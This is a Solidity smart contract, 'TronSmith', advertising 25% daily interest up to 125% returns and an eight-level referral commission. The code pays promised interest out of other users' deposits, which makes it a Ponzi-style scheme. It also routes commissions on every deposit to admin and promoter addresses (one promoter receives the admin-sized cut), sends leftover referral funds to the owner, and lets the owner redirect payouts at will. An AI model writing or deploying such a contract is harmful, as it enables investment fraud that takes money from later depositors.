//SourceUnit: TronSmith.sol

/*
 * Tron Smith 
 * Main Website - https://www.tronsmith.club
 * 25% Daily Interest Until you earn 125% of your investment
 * 8 Level Referral Commission
 * Once you have earned 125% from the daily interest or referral commisison, the daily interest stops...
 */

pragma solidity ^0.4.25;

contract TronSmith {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint private minDepositSize = 50000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 4;
    uint public promoterCommission = 2;
    uint public Interest = 125;
    uint public commissionDivisor = 100;
    uint public collectProfit;
    uint private minuteRate = 2893519;
    uint private releaseTime = 1608220800;
    address private Admin = msg.sender;
    address private Promoter1 = msg.sender;
    address private Promoter2 = msg.sender;
     
    address owner;
    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
    }

    mapping(address => Player) public players;

    constructor() public {
      owner = msg.sender;
    }


    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      address _affAddr8 = players[_affAddr7].affFrom;

      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
      players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);
      players[_affAddr5].aff5sum = players[_affAddr5].aff5sum.add(1);
      players[_affAddr6].aff6sum = players[_affAddr6].aff6sum.add(1);
      players[_affAddr7].aff7sum = players[_affAddr7].aff7sum.add(1);
      players[_affAddr8].aff8sum = players[_affAddr8].aff8sum.add(1);
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not launched yet!");
        //collect(msg.sender);
        require(msg.value >= minDepositSize);


        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
        uint admin = depositAmount.mul(devCommission).div(commissionDivisor);
        uint promoter = depositAmount.mul(promoterCommission).div(commissionDivisor);
        Admin.transfer(admin);
        Promoter1.transfer(admin);
        Promoter2.transfer(promoter);
        
  }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);

      distributeRef(depositAmount, player.affFrom);

        uint admin = depositAmount.mul(devCommission).div(commissionDivisor);
        uint promoter = depositAmount.mul(promoterCommission).div(commissionDivisor);
        Admin.transfer(admin);
        Promoter1.transfer(admin);
        Promoter2.transfer(promoter);
        
        }


    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
        
         uint collectProfitGross = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
         
         uint256 maxprofit = (player.trxDeposit.mul(Interest).div(commissionDivisor));
         uint256 collectProfitNet = collectProfitGross.add(player.interestProfit);
         uint256 amountpaid = (player.payoutSum.add(player.affRewards));
         uint256 sum = amountpaid.add(collectProfitNet);
         
         
                if (sum <= maxprofit) {
             collectProfit = collectProfitGross; 
        } 
        else{
            uint256 collectProfit_net = maxprofit.sub(amountpaid); 
             
             if (collectProfit_net > 0) {
             collectProfit = collectProfit_net; 
             }
              else{
              collectProfit = 0; 
              }
  }
         
         if (collectProfit > address(this).balance){collectProfit = 0;}
         
         player.interestProfit = player.interestProfit.add(collectProfit);
         player.time = player.time.add(secPassed);
         
                  
 }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
            }
        }
    }

     function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(15)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(4)).div(100);
            _affRewards = min(_affRewards, remainingProfit(_affAddr1));
            if(_affRewards > 0){
              _allaff = _allaff.sub(_affRewards);
              players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
              _affAddr1.transfer(_affRewards);
            }
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(3)).div(100);
            _affRewards = min(_affRewards, remainingProfit(_affAddr2));
            if(_affRewards > 0){
              _allaff = _allaff.sub(_affRewards);
              players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
              _affAddr2.transfer(_affRewards);
            }
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _affRewards = min(_affRewards, remainingProfit(_affAddr3));
            if(_affRewards > 0){
              _allaff = _allaff.sub(_affRewards);
              players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
              _affAddr3.transfer(_affRewards);
            }
        }

        if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);

            _affRewards = min(_affRewards, remainingProfit(_affAddr4));
            if(_affRewards > 0){
              _allaff = _allaff.sub(_affRewards);
              players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
              _affAddr4.transfer(_affRewards);
            }
        }

        if (_affAddr5 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            _affRewards = min(_affRewards, remainingProfit(_affAddr5));
            if(_affRewards > 0){
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
            _affAddr5.transfer(_affRewards);
          }
        }

        if (_affAddr6 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            _affRewards = min(_affRewards, remainingProfit(_affAddr6));
            if(_affRewards > 0){
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr6].affRewards = _affRewards.add(players[_affAddr6].affRewards);
            _affAddr6.transfer(_affRewards);
          }
        }

        if (_affAddr7 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            _affRewards = min(_affRewards, remainingProfit(_affAddr7));
            if(_affRewards > 0){
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr7].affRewards = _affRewards.add(players[_affAddr7].affRewards);
            _affAddr7.transfer(_affRewards);
          }
        }

        if (_affAddr8 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
           _affRewards = min(_affRewards, remainingProfit(_affAddr8));
            if(_affRewards > 0){
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr8].affRewards = _affRewards.add(players[_affAddr8].affRewards);
            _affAddr8.transfer(_affRewards);
          }
        }

        if(_allaff > 0 ){
            owner.transfer(_allaff);
        }
    }


    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);
      uint secPassed = now.sub(player.time);
     
      if (secPassed > 0) {
      uint256 collectProfitGross = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
      uint256 maxprofit = (player.trxDeposit.mul(Interest).div(commissionDivisor));
      uint256 collectProfitNet = collectProfitGross.add(player.interestProfit);
      uint256 amountpaid = (player.payoutSum.add(player.affRewards));
      uint256 sum = amountpaid.add(collectProfitNet);
      
       if (sum <= maxprofit) {
             collectProfit = collectProfitGross; 
        } 
        else{
            uint256 collectProfit_net = maxprofit.sub(amountpaid); 
             
             if (collectProfit_net > 0) {
             collectProfit = collectProfit_net; 
             }
              else{
              collectProfit = 0; 
              }
  }
       
       if (collectProfit > address(this).balance){collectProfit = 0;}
            
  }
  
   return collectProfit.add(player.interestProfit);
      
      }
    
    
    function remainingProfit(address _addr) public view returns (uint) {
        Player storage player = players[_addr];

        uint playerTotalPayout = player.interestProfit.add(player.affRewards).add(player.payoutSum);
        uint maxPayout = (player.trxDeposit.mul(Interest).div(commissionDivisor));
        return maxPayout.sub(playerTotalPayout);
    }
    
        
    function min(uint a, uint b) public pure returns (uint){
      return a > b ? b : a;
    }
    
     function updateAdmin(address _address)  {
       require(msg.sender==owner);
       Admin = _address;
    }
    
     function updatePromoter1(address _address)  {
       require(msg.sender==owner);
       Promoter1 = _address;
    }
    
       function updatePromoter2(address _address)  {
       require(msg.sender==owner);
       Promoter2 = _address;
    }
        
     function setReleaseTime(uint256 _ReleaseTime) public {
      require(msg.sender==owner);
      releaseTime = _ReleaseTime;
    }
    
    function setOwner(address _address) public {
      require(msg.sender==owner);
      owner = _address;
    }
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}